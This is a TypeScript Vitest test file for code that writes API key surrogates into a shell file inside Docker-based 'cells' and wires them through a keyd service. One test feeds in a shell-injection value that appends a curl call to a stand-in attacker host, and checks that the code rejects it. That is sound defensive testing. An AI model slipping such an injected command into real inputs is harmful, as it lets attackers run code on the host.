import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { DockerClient } from "../cells/docker.ts";
import { type FakeDocker, startFakeDocker } from "../cells/testing/fake-docker.ts";
import { sampleRecord } from "../cells/testing/sample-record.ts";
import type { CellSummary } from "../cells/types.ts";
import {
  CELL_FILES_DIR,
  CellKeydWiring,
  KeyLayerError,
  refreshRunningCells,
  surrogatesFile,
} from "./cell-wiring.ts";
import { KeydClient } from "./client.ts";
import { type FakeKeyd, fakeSurrogate, startFakeKeyd } from "./testing/fake-keyd.ts";

const http = (id: string) => ({ id, kind: "http" as const, createdAt: "t", updatedAt: "t" });
const HEADER = "# Surrogates for this computer's web API keys: they work only through keyd.";

describe("surrogatesFile", () => {
  it("exports each surrogate under its prefixed name, sorted", () => {
    const a = fakeSurrogate();
    const b = fakeSurrogate();
    expect(surrogatesFile({ "z-api": a, weather: b })).toBe(
      `${HEADER}\nexport LOCALDOT_KEY_WEATHER='${b}'\nexport LOCALDOT_KEY_Z_API='${a}'\n`,
    );
    expect(surrogatesFile({})).toBe(`${HEADER}\n`);
  });

  it("refuses anything a shell could read as more than a value", () => {
    expect(() => surrogatesFile({ weather: "ld_key_x'; curl evil.example #" })).toThrow(
      KeyLayerError,
    );
    expect(() => surrogatesFile({ "a;b": fakeSurrogate() })).toThrow(KeyLayerError);
  });

  it("refuses names that would overwrite one another's shell variable", () => {
    expect(() => surrogatesFile({ "a-b": fakeSurrogate(), a_b: fakeSurrogate() })).toThrow(
      KeyLayerError,
    );
  });
});

describe("CellKeydWiring.revoke", () => {
  it("revokes nothing, without an error, for a cell keyd no longer knows", async () => {
    const keyd = await startFakeKeyd();
    try {
      const docker = new DockerClient("/tmp/ld-no-docker.sock");
      const wiring = new CellKeydWiring({ keyd: new KeydClient(keyd.socketPath, 1000), docker });
      expect(await wiring.revoke("01JXYZ0000000000000000ABCD")).toBe(0);
      keyd.failures.set("POST /v1/cells/", { status: 500, code: "internal" });
      await expect(wiring.revoke("01JXYZ0000000000000000ABCD")).rejects.toMatchObject({
        code: "internal",
      });
    } finally {
      await keyd.close();
    }
  });
});

describe("CellKeydWiring.refresh", () => {
  let docker: FakeDocker;
  let keyd: FakeKeyd;
  beforeEach(async () => {
    docker = await startFakeDocker();
    keyd = await startFakeKeyd();
  });
  afterEach(async () => {
    vi.restoreAllMocks();
    await docker.close();
    await keyd.close();
  });

  it("closes a cell whose credentials could not be installed", async () => {
    const record = sampleRecord("01JXYZ0000000000000000ABCD");
    const client = new KeydClient(keyd.socketPath, 1000);
    const dockerClient = new DockerClient(docker.socketPath);
    vi.spyOn(dockerClient, "request").mockResolvedValue({ State: { Running: false } });
    vi.spyOn(dockerClient, "putArchive").mockRejectedValue(new Error("archive failed"));
    const wiring = new CellKeydWiring({ keyd: client, docker: dockerClient });
    await expect(wiring.wire(record)).rejects.toThrow("archive failed");
    expect(keyd.cells.has(record.id)).toBe(false);
  });

  it("requires the cell identity, role and exact surrogate set, and revokes a failed refresh", async () => {
    const record = sampleRecord("01JXYZ0000000000000000ABCD");
    const client = new KeydClient(keyd.socketPath, 1000);
    const dockerClient = new DockerClient(docker.socketPath);
    vi.spyOn(dockerClient, "request").mockResolvedValue({ State: { Running: false } });
    const write = vi.spyOn(dockerClient, "putArchive").mockResolvedValue();
    const wiring = new CellKeydWiring({ keyd: client, docker: dockerClient });
    keyd.records.set("weather", http("weather"));
    await wiring.wire(record);
    const cell = keyd.cells.get(record.id);
    if (!cell) throw new Error("cell missing");
    expect(await wiring.isWired(record)).toBe(true);
    cell.role = "brain";
    expect(await wiring.isWired(record)).toBe(false);
    cell.role = "desktop";
    const mint = vi.spyOn(client, "mint").mockResolvedValue({ wrong: fakeSurrogate() });
    await expect(wiring.refresh(record)).rejects.toThrow("unexpected keys");
    expect(cell.valid.size).toBe(0);
    expect(write).toHaveBeenCalledTimes(1);
    mint.mockRestore();
    write.mockRejectedValueOnce(new Error("archive failed"));
    await expect(wiring.refresh(record)).rejects.toThrow("archive failed");
    expect(cell.valid.size).toBe(0);
  });

  it("gives keyd the gate's capture token only when keyd says it takes one", async () => {
    const record = sampleRecord("01JXYZ0000000000000000ABCD");
    record.tokens.capture = "c".repeat(43);
    const dockerClient = new DockerClient(docker.socketPath);
    vi.spyOn(dockerClient, "request").mockResolvedValue({ State: { Running: false } });
    vi.spyOn(dockerClient, "putArchive").mockResolvedValue();
    const wiring = new CellKeydWiring({
      keyd: new KeydClient(keyd.socketPath, 1000),
      docker: dockerClient,
    });
    const opened = () =>
      keyd.calls.filter((c) => c.method === "POST" && c.path === "/v1/cells").at(-1)?.body;
    keyd.capture = false;
    await wiring.wire(record);
    expect(keyd.cells.has(record.id)).toBe(true);
    expect(opened()).not.toHaveProperty("captureToken");
    keyd.capture = true;
    await wiring.wire(record);
    expect(opened()).toMatchObject({ captureToken: record.tokens.capture });
  });

  it("rejects a mismatched open result before writing and refuses wiring a running desktop", async () => {
    const record = sampleRecord("01JXYZ0000000000000000ABCD");
    const client = new KeydClient(keyd.socketPath, 1000);
    const dockerClient = new DockerClient(docker.socketPath);
    const inspect = vi
      .spyOn(dockerClient, "request")
      .mockResolvedValue({ State: { Running: false } });
    const write = vi.spyOn(dockerClient, "putArchive").mockResolvedValue();
    const open = client.openCell.bind(client);
    vi.spyOn(client, "openCell").mockImplementation(async (req) => ({
      ...(await open(req)),
      cellId: "another-cell",
    }));
    const wiring = new CellKeydWiring({ keyd: client, docker: dockerClient });
    await expect(wiring.wire(record)).rejects.toThrow(KeyLayerError);
    expect(write).not.toHaveBeenCalled();
    expect(keyd.cells.has(record.id)).toBe(false);
    inspect.mockResolvedValue({ State: { Running: true } });
    await expect(wiring.wire(record)).rejects.toThrow("stop the computer");
  });

  it("mints new surrogates after a revoke, skipping a key keyd refuses for this cell", async () => {
    const record = sampleRecord("01JXYZ0000000000000000ABCD");
    docker.state.containers.set(record.docker.desktop, {
      name: record.docker.desktop,
      body: { Image: "i", HostConfig: {} },
      running: false,
      paused: false,
      exitCode: 0,
      starts: 1,
      ports: {},
      networks: {},
      files: new Map(),
    });
    keyd.records.set("weather", http("weather"));
    const client = new DockerClient(docker.socketPath);
    const wiring = new CellKeydWiring({
      keyd: new KeydClient(keyd.socketPath, 1000),
      docker: client,
    });
    await wiring.wire(record);
    const container = docker.state.containers.get(record.docker.desktop);
    if (container) container.running = true;
    expect(await wiring.revoke(record.id)).toBe(1);
    keyd.records.set("maps", http("maps"));
    // keyd refuses the first key asked for (weather, in keyd's order), as it does for a host
    // outside the cell's CA: that key waits for the next start, the other gets its surrogate.
    keyd.failures.set(`POST /v1/cells/${record.id}/surrogates`, {
      status: 400,
      code: "bad-request",
    });
    expect(await wiring.refresh(record)).toEqual(["weather"]);
    const files = docker.state.containers.get(record.docker.desktop)?.files;
    const text = files?.get(`${CELL_FILES_DIR}/surrogates.sh`)?.toString() ?? "";
    expect(text).not.toContain("LOCALDOT_KEY_WEATHER");
    expect(text).toContain(`LOCALDOT_KEY_MAPS='${keyd.cells.get(record.id)?.surrogates.maps}'`);
  });
});

describe("refreshRunningCells", () => {
  const summary = (id: string, state: CellSummary["state"], paused?: true): CellSummary => ({
    id,
    state,
    scale: 2,
    createdAt: "t",
    stream: { connection: "none", viewers: 0, lastUpstreamAt: null },
    ...(paused ? { paused } : {}),
  });

  it("refreshes running and booting computers, and says when one must restart to use the key", async () => {
    const cells = [
      summary("A", "ready"),
      summary("B", "ready", true),
      summary("C", "stopped"),
      summary("D", "ready"),
      summary("E", "starting"),
    ];
    const refreshed: string[] = [];
    const out = await refreshRunningCells(
      {
        list: () => cells,
        refreshKeys: async (id) => {
          refreshed.push(id);
          if (id === "D") throw new Error("keyd went away");
          return id === "A" ? ["maps"] : [];
        },
      },
      "maps",
    );
    expect(refreshed).toEqual(["A", "D", "E"]);
    expect(out).toEqual({ restart: true });
  });
});

it("reports a failed refresh as needing a restart without logging its exception", async () => {
  const log = vi.spyOn(console, "error").mockImplementation(() => {});
  try {
    const cells = {
      list: () => [
        {
          id: "A",
          state: "ready" as const,
          scale: 2 as const,
          createdAt: "t",
          stream: { connection: "none" as const, viewers: 0, lastUpstreamAt: null },
        },
      ],
      refreshKeys: async () => {
        throw new Error("private-provider-key");
      },
    };
    expect(await refreshRunningCells(cells, "weather")).toEqual({ restart: true });
    expect(log.mock.calls.flat().map(String).join("\n")).not.toContain("private-provider-key");
  } finally {
    log.mockRestore();
  }
});
